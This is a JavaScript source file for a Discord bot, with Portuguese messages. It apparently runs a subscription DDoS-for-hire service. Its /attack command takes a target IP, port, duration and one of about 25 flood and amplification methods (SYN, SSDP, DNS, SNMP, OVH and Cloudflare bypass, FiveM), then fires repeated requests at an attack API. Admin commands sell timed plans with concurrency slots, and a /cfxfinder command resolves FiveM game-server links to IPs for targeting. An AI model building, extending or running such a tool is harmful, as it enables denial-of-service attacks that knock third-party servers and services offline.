require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, Collection } = require('discord.js');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const db = new sqlite3.Database(path.join(__dirname, 'bot.sqlite'));
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS config (
        key TEXT PRIMARY KEY,
        value TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS users (
        discord_id TEXT PRIMARY KEY,
        expires_at INTEGER,
        concurrent_limit INTEGER,
        banned INTEGER DEFAULT 0
    )`);
});
console.log("📁 Tabelas do banco de dados verificadas/criadas.");


const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const commands = new Collection();

// ─── Utilitários ───────────────────────────────────────────────────────────────
function isExpired(timestamp) {
    return Date.now() > timestamp;
}



function getUserData(id) {
    return new Promise((resolve, reject) => {
        db.get('SELECT * FROM users WHERE discord_id = ?', [id], (err, row) => {
            if (err) return reject(err);
            resolve(row);
        });
    });
}

function checkChannelAllowed(channelId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT value FROM config WHERE key = "allowed_channel"', (err, row) => {
            if (err) return reject(err);
            resolve(!row || row.value === channelId);
        });
    });
}


// ─── Comandos Slash ────────────────────────────────────────────────────────────


function checkChannelAllowed(channelId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT value FROM config WHERE key = "allowed_channel"', (err, row) => {
            if (err) return reject(err);
            resolve(!row || row.value === channelId);
        });
    });
}




const commandList = [
    new SlashCommandBuilder()
        .setName('attack')
        .setDescription('Envia ataque via API')
        .addStringOption(opt => opt.setName('host').setDescription('IP').setRequired(true))
        .addIntegerOption(opt => opt.setName('port').setDescription('Porta').setRequired(true))
        .addIntegerOption(opt => opt.setName('time').setDescription('Tempo').setRequired(true))
        .addStringOption(opt => opt.setName('method').setDescription('Método').setRequired(true).addChoices(
            { name: 'stun', value: 'stun' },
            { name: 'tcpamp', value: 'tcpamp' },
            { name: 'discord', value: 'discord' },
            { name: 'tcpbypassv2', value: 'tcpbypassv2' },
            { name: 'mta', value: 'mta' },
            { name: 'httpbypass', value: 'httpbypass' },
            { name: 'ts3', value: 'ts3' },
            { name: 'dns', value: 'dns' },
            { name: 'raknet', value: 'raknet' },
            { name: 'udppps', value: 'udppps' },
            { name: 'fivem', value: 'fivem' },
            { name: 'handshake', value: 'handshake' },
            { name: 'ovhtcp', value: 'ovhtcp' },
            { name: 'ovhudp', value: 'ovhudp' },
            { name: 'http-nodusv2', value: 'http-nodusv2' },
            { name: 'httpbypass cloudflare', value: 'httpbypass' },
            { name: 'fivemv2', value: 'fivemv2' },
            { name: 'ssdp', value: 'ssdp' },
            { name: 'snmp', value: 'snmp' },
            { name: 'samp udp', value: 'samp' },
            { name: 'socket', value: 'socket' },
            { name: 'udpa2s', value: 'udpa2s' },
            { name: 'udpbypass', value: 'udpbypass' },
            { name: 'syn', value: 'syn' },
            { name: 'wra', value: 'wra' }
            
        ))
        .addIntegerOption(opt => opt.setName('repeat').setDescription('Quantas vezes repetir o ataque').setRequired(true)),
    
    new SlashCommandBuilder().setName('ajuda').setDescription('Mostra todos os comandos disponíveis'),
    
    new SlashCommandBuilder().setName('metodos').setDescription('Mostra os métodos disponíveis'),
    
    new SlashCommandBuilder()
        .setName('setar')
        .setDescription('Define plano de um usuário')
        .addUserOption(opt => opt.setName('usuario').setDescription('Usuário').setRequired(true))
        .addIntegerOption(opt => opt.setName('dias').setDescription('Dias de acesso').setRequired(true))
        .addIntegerOption(opt => opt.setName('concurrent').setDescription('Concurrent (até 8)').setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('ban')
        .setDescription('Bane um usuário')
        .addUserOption(opt => opt.setName('usuario').setDescription('Usuário').setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('resetar')
        .setDescription('Reseta o plano de um usuário')
        .addUserOption(opt => opt.setName('usuario').setDescription('Usuário').setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('autorizarchannel')
        .setDescription('Autoriza um canal para usar comandos')
        .addChannelOption(option =>
            option.setName('canal')
                .setDescription('Canal a ser autorizado')
                .setRequired(true)),


     new SlashCommandBuilder()
         .setName('cfxfinder')
         .setDescription('Obtém informações de um servidor FiveM usando o link cfx.re')
         .addStringOption(opt => opt.setName('cfx')
         .setDescription('Link cfx.re do servidor')
        .setRequired(true))
             
    
];

// ─── Lógica ─────────────────────────────────────────────────────────────────────
client.once('ready', () => {
    console.log(`🤖 Logado como ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const cmd = interaction.commandName;
    const userId = interaction.user.id;
    
    if (cmd === 'autorizarchannel' && userId === '1340072138656186380') {
        const canal = interaction.options.getChannel('canal');
        db.run('INSERT OR REPLACE INTO config (key, value) VALUES ("allowed_channel", ?)', [canal.id], err => {
            if (err) {
                console.error(err);
                return interaction.reply({ content: '❌ Erro ao salvar canal.', ephemeral: true });
            }
            interaction.reply(`✅ Canal <#${canal.id}> autorizado com sucesso.`);
        });
    }

    // Verifica canal permitido
    if (!(await checkChannelAllowed(interaction.channelId))) {
        return interaction.reply({ content: '❌ Este comando só pode ser usado em um canal autorizado.', ephemeral: true });
    
    }
  

    if (cmd === 'cfxfinder') {
        const cfxLink = interaction.options.getString('cfx');
        const cfxCodeMatch = cfxLink.match(/cfx\.re\/join\/([a-zA-Z0-9]+)/);
        if (!cfxCodeMatch) {
            return interaction.reply({ content: '❌ Link inválido. Use o formato: cfx.re/join/xxxxx', ephemeral: true });
        }
        const cfxCode = cfxCodeMatch[1];
        try {
            const res = await axios.get(`https://servers-frontend.fivem.net/api/servers/single/${cfxCode}`);
            const data = res.data;
            const ip = data?.Data?.connectEndPoints?.[0]?.split(':')[0] || 'Desconhecido';
            const port = data?.Data?.connectEndPoints?.[0]?.split(':')[1] || 'Desconhecido';
            const name = data?.Data?.hostname || 'Desconhecido';
            const players = data?.Data?.clients || 0;
            const maxPlayers = data?.Data?.sv_maxclients || 0;
            const status = '🟢 Online';
            interaction.reply(
                `📡 **Informações do Servidor:**\n` +
                `🌐 IP: \`${ip}\`\n` +
                `🔌 Porta: \`${port}\`\n` +
                `📛 Nome: \`${name}\`\n` +
                `📈 Jogadores: \`${players}/${maxPlayers}\`\n` +
                `✅ Status: ${status}`
            );
        } catch (err) {
            console.error(err);
            interaction.reply({ content: '❌ Servidor offline ou código inválido.', ephemeral: true });
        }
    }
    


    if (cmd === 'attack') {
        const userData = await getUserData(userId);
        if (!userData || userData.banned) return interaction.reply({ content: '❌ Você não tem permissão.', ephemeral: true });
        if (isExpired(userData.expires_at)) return interaction.reply({ content: '⛔ Seu plano expirou.', ephemeral: true });

        const host = interaction.options.getString('host');
        const port = interaction.options.getInteger('port');
        const time = interaction.options.getInteger('time');
        const method = interaction.options.getString('method');
        const repeat = interaction.options.getInteger('repeat');

        if (repeat > userData.concurrent_limit) {
            return interaction.reply({ content: `❌ Você só pode usar até ${userData.concurrent_limit} ataques por vez.`, ephemeral: true });
        }

        for (let i = 0; i < repeat; i++) {
            const url = process.env.API_URL
                .replace('{HOST}', host)
                .replace('{PORT}', port)
                .replace('{TIME}', time)
                .replace('{METHOD}', method);
            axios.get(url).catch(console.error);
        }

        interaction.reply(`✅ Ataque enviado com sucesso **${repeat}x**:\n🖥 IP: \`${host}\`\n🔌 Porta: \`${port}\`\n⏱ Tempo: \`${time}s\`\n🚀 Método: \`${method}\``);
    }

    if (cmd === 'ajuda') {
        interaction.reply(
            "**📖 Comandos disponíveis:**\n" +
            "`/attack` - Enviar ataque\n" +
            "`/metodos` - Ver métodos disponíveis\n" +
            "`/ajuda` - Ver todos os comandos\n"
        );
    }

    if (cmd === 'metodos') {
        interaction.reply("🚀 **Métodos disponíveis:**\n- LAYER 7 - LAYER 3");
    }

    if (cmd === 'setar' && userId === '1340072138656186380') {
        const user = interaction.options.getUser('usuario');
        const dias = interaction.options.getInteger('dias');
        const concurrent = Math.min(interaction.options.getInteger('concurrent'), 8);
        const expires_at = Date.now() + dias * 86400000;

        db.run(`
            INSERT INTO users (discord_id, expires_at, concurrent_limit, banned)
            VALUES (?, ?, ?, 0)
            ON CONFLICT(discord_id) DO UPDATE SET expires_at=?, concurrent_limit=?
        `, [user.id, expires_at, concurrent, expires_at, concurrent]);

        interaction.reply(`✅ Plano ativado para <@${user.id}> por ${dias} dias com ${concurrent} slots.`);
    }

    if (cmd === 'ban' && userId === '1340072138656186380') {
        const user = interaction.options.getUser('usuario');
        db.run('UPDATE users SET banned = 1 WHERE discord_id = ?', [user.id]);
        interaction.reply(`🔨 Usuário <@${user.id}> banido.`);
    }

    if (cmd === 'resetar' && userId === '1340072138656186380') {
        const user = interaction.options.getUser('usuario');
        db.run('DELETE FROM users WHERE discord_id = ?', [user.id]);
        interaction.reply(`♻️ Plano de <@${user.id}> resetado.`);
    }
});

// ─── Registro de comandos ──────────────────────────────────────────────────────
const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
(async () => {
    try {
        console.log('⏳ Registrando comandos...');
        await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commandList.map(cmd => cmd.toJSON()) });
        console.log('✅ Comandos registrados.');
    } catch (err) {
        console.error(err);
    }
})();

client.login(process.env.DISCORD_TOKEN);
